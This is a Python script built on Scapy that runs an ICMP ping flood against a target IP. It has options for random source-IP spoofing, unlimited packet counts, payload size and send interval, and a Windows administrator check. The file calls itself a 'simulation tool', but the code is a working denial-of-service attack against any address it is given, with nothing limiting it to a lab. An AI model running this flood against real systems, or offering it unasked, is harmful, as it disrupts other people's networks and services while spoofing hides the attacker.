#!/usr/bin/env python3
from scapy.all import *
from scapy.arch.windows import get_windows_if_list
import argparse
import random
import time
import sys
import os
import ctypes

def generate_random_ip():
    """Generate a random IP address for spoofing"""
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def ping_flood(target_ip, count=1000, interval=0.1, spoof=False, verbose=False, size=64):
    """
    Simulate a ping flood attack (Windows compatible)
    :param target_ip: Target IP address
    :param count: Number of ICMP packets to send (0 for unlimited)
    :param interval: Delay between packets in seconds
    :param spoof: Whether to spoof source IP addresses
    :param verbose: Show packet information
    :param size: Payload size in bytes
    """
    sent = 0
    print(f"[*] Starting ICMP flood attack on {target_ip}")
    
    # Create payload
    payload = b'X' * size
    
    try:
        while True:
            src_ip = generate_random_ip() if spoof else None
            packet = IP(dst=target_ip, src=src_ip)/ICMP()/payload
            
            if verbose:
                print(f"Sending packet #{sent+1}: {packet.summary()}")
            
            # Windows-compatible send method with error handling
            try:
                send(packet, verbose=0)
                sent += 1
            except Exception as e:
                print(f"[!] Error sending packet: {e}")
                time.sleep(1)
                continue
            
            if count > 0 and sent >= count:
                break
                
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    print(f"[*] Attack completed. Total packets sent: {sent}")

def verify_environment():
    """Check for common Windows issues"""
    if os.name == 'nt':
        # Check admin privileges
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] Administrator privileges required")
                return False
        except:
            print("[!] Could not verify admin privileges")
    
    return True

def list_interfaces():
    """List available network interfaces (Windows compatible)"""
    print("\nAvailable network interfaces:")
    for iface in get_windows_if_list():
        print(f"  - {iface['name']} (Desc: {iface['description']})")
    print()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Windows-Compatible ICMP Flood Attack Simulation Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-c", "--count", type=int, default=1000, 
                        help="Number of packets to send (0 for unlimited)")
    parser.add_argument("-i", "--interval", type=float, default=0.1,
                        help="Interval between packets in seconds")
    parser.add_argument("-s", "--spoof", action="store_true",
                        help="Spoof source IP addresses")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    parser.add_argument("-iface", "--interface", default=None,
                        help="Specify network interface (recommended on Windows)")
    parser.add_argument("-size", "--payload-size", type=int, default=64,
                        help="ICMP payload size in bytes")
    
    args = parser.parse_args()
    
    if not verify_environment():
        sys.exit(1)
    
    # Windows-specific setup
    if os.name == 'nt':
        if args.interface:
            conf.iface = args.interface
        
        # Important Windows-specific configurations
        conf.use_pcap = True
        conf.sniff_promisc = False
        
        # List interfaces if none specified
        if not conf.iface:
            print("[!] No network interface specified")
            list_interfaces()
            sys.exit(1)
    
    print("[*] Starting ICMP flood attack simulation (Ctrl+C to stop)")
    
    # First verify connectivity with a single ping
    print("[*] Sending test ping...")
    try:
        test_ping = sr1(IP(dst=args.target)/ICMP(), timeout=2, verbose=0)
        if test_ping:
            print("[+] Test ping successful! Starting flood...")
        else:
            print("[!] Test ping failed! Check network connectivity and firewall settings")
            sys.exit(1)
    except Exception as e:
        print(f"[!] Error sending test ping: {e}")
        sys.exit(1)
    
    ping_flood(
        target_ip=args.target,
        count=args.count,
        interval=args.interval,
        spoof=args.spoof,
        verbose=args.verbose,
        size=args.payload_size
    )